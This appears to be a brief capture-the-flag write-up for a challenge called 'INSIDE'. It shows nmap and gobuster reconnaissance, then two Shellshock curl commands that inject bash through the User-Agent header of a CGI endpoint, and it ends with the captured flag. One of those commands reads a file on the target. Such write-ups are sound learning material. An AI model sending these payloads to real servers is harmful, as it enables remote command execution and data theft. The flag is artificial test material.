# INSIDE

<img width="1918" height="766" alt="image" src="https://github.com/user-attachments/assets/8a650de6-a5ba-49fd-bf4c-2ff8b9bd1abd" />

```
nmap -sCV 54.219.223.93
```

<img width="843" height="351" alt="image" src="https://github.com/user-attachments/assets/fbbade4f-73c2-4d31-b100-b54d2783f51a" />

```
gobuster dir -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt -u http://54.219.223.93
```

<img width="587" height="206" alt="image" src="https://github.com/user-attachments/assets/99ee7e7f-cc6a-497e-b177-e2f6728e19dc" />

> ## shellshock

```
curl -s -D - \
  -H 'User-Agent: () { :; }; /bin/bash -c "echo; echo VULNTEST"' \
  'http://13.56.213.177/cgi-bin/status?_cb=1' | sed -n '1,200p'

```

```
curl -s -D - \
  -H 'User-Agent: () { :; }; /bin/bash -c "echo; echo START; cat /home/inside; echo END"' \
  'http://13.56.213.177/cgi-bin/status?_cb=ts' | sed -n '1,200p'

```

 
```
FLAG{InSiDe_ShOcK_WaVe_StAy_HoMe_StAy_SaFe}
```

